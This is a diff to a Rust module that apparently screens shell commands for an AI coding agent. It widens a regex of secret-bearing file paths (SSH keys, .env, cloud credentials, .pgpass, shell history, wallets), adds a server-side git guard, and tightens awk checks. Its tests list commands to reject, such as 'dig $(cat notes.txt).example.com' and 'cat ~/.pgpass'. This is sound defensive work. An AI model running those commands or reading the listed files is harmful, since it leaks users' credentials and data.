@@ -18,7 +18,7 @@ use crate::shell::{self, Command};
 /// Files that may hold secrets, never read when looking.
 static SECRETS: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(
-        r"(?i)(\.ssh/|id_(rsa|dsa|ecdsa|ed25519)|\.env(\.|$|/)|\.(pem|key|p12|pfx|keystore|jks|kdbx)$|\.aws/|\.azure/|\.config/gcloud|\.kube/config|\.docker/config|\.netrc|\.npmrc|\.pypirc|\.git-credentials|credentials|secrets?(\.|/|$)|/etc/shadow|/etc/sudoers|keychain|\.gnupg|token|password|\.vault)",
+        r"(?i)(\.ssh/|id_(rsa|dsa|ecdsa|ed25519)|\.env(\.|$|/)|\.(pem|key|p12|pfx|keystore|jks|kdbx)$|\.aws/|\.azure/|\.config/gcloud|\.kube/config|\.docker/config|\.netrc|\.npmrc|\.pypirc|\.git-credentials|credentials|secrets?(\.|/|$)|/etc/shadow|/etc/sudoers|keychain|\.gnupg|token|password|\.vault|\.pgpass|\.my\.cnf|kubeconfig|\.ovpn$|\.tfstate|htpasswd|_history$|\.history$|wallet)",
     )
     .expect("secrets pattern")
 });
@@ -27,6 +27,28 @@ static SECRETS: LazyLock<Regex> = LazyLock::new(|| {
 /// not filled in from files or other commands.
 const NETWORK: &[&str] =
     &["dig", "host", "nslookup", "ping", "npm", "pnpm", "yarn", "brew", "kubectl", "pip", "pip3", "apt", "apt-cache", "dnf", "yum", "snap", "flatpak", "go"];
+
+/// Whether a file may hold secrets, so it is never read without asking.
+pub fn secret(path: &str) -> bool {
+    SECRETS.is_match(path)
+}
+
+/// Whether `text` only looks, as it would run on a server: as `check`, and
+/// git may not look at the working files there, where a repository's own
+/// filters could run a program and no sandbox walls it in.
+pub fn check_on_server(text: &str) -> Result<(), String> {
+    check(text)?;
+    let script = shell::parse(text);
+    for command in script.commands.iter().filter(|command| command.name() == "git") {
+        let words: Vec<&str> = command.args.iter().map(String::as_str).filter(|arg| !arg.starts_with('-')).collect();
+        // Past `-C dir`.
+        let first = if command.args.first().is_some_and(|arg| arg == "-C") { words.get(1) } else { words.first() };
+        if first.is_some_and(|word| matches!(*word, "status" | "diff" | "blame" | "grep")) {
+            return Err("`git` may not read the working files on a server without your OK".into());
+        }
+    }
+    Ok(())
+}
 
 /// Whether `text` uses a program that talks to the network.
 pub fn uses_network(text: &str) -> bool {
@@ -154,7 +176,10 @@ fn looks(command: &Command) -> Result<(), &'static str> {
         },
         "sed" => sed(command),
         "awk" | "gawk" | "mawk" | "nawk" => {
-            if args.iter().any(|arg| arg.contains("system(") || arg.contains('>') || arg.contains('|')) {
+            // A program from a file or an extension can't be read here.
+            if has(command, &["-f", "--file", "-l", "--load", "-i", "--include", "-E", "--exec"])
+                || args.iter().any(|arg| arg.contains("system(") || arg.contains('>') || arg.contains('|') || arg.contains("@load") || arg.contains("@include"))
+            {
                 Err("may not write files or run commands")
             } else {
                 Ok(())
@@ -456,6 +481,10 @@ mod tests {
             "git grep -O x",
             "cargo metadata",
             "dig $(cat notes.txt).example.com",
+            "awk -f prog.awk data",
+            "gawk '@load \"filefuncs\"; BEGIN { print 1 }'",
+            "cat ~/.zsh_history",
+            "cat ~/.pgpass",
             "ping -c 1 `whoami`.example.com",
             "npm cache clean --force",
             "docker system prune -f",
@@ -466,5 +495,8 @@ mod tests {
             assert!(check(text).is_err(), "{text}");
         }
         assert_eq!(check("ls > out.txt"), Err("it writes to out.txt with >".into()));
+        // On a server, git doesn't look at working files without an OK.
+        assert!(check_on_server("git -C ~/app status").is_err() && check_on_server("git log --oneline").is_ok() && check("git status").is_ok());
+        assert!(secret("~/.ssh/id_ed25519") && secret("/srv/app/.env") && !secret("~/Projects/app/src/main.rs"));
     }
 }
